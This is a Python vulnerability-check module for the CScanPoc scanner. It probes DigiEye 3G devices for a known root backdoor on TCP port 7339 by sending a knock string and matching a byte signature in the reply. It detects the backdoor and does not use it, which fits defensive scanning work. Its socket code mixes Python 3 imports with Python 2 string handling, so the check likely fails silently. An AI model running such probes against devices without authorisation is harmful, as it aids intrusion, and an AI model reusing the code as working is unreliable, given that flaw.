# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import socket
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'DigiEye_0001'  # 平台漏洞编号，留空
    name = 'DigiEye 3G(software version 3.19.30004) Backdoor'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-07-07'  # 漏洞公布时间
    desc = '''
        Affected devices include a backdoor service listening on TCP
        port 7339. This service implements a challenge-response protocol to
        "authenticate" clients. After this step, clients are allowed to execute
        arbitrary commands on the device, with administrative (root) privileges. We
        would like to stress out that, to the best of our knowledge, end-users are not
        allowed to disable the backdoor service, nor to control the "authentication"
        mechanism.
    '''  # 漏洞描述
    ref = 'http://seclists.org/bugtraq/2014/Jul/17'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DigiEye 3G'  # 漏洞应用名称
    product_version = 'software version 3.19.30004'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '41287aa9-4257-44d4-bbc7-91c629ab642c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            o = urllib.parse.urlparse(self.target)
            target = o.hostname
            sock.settimeout(6)
            sock.connect((target, 7339))
            # print '[*] %s - Send data ...' % target
            sock.send('KNOCK-KNOCK-ANYONETHERE?\x00')
            resp = sock.recv(12)
            sock.close()
            if resp[-4:] == '\x00\x0A\xAE\x60':
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
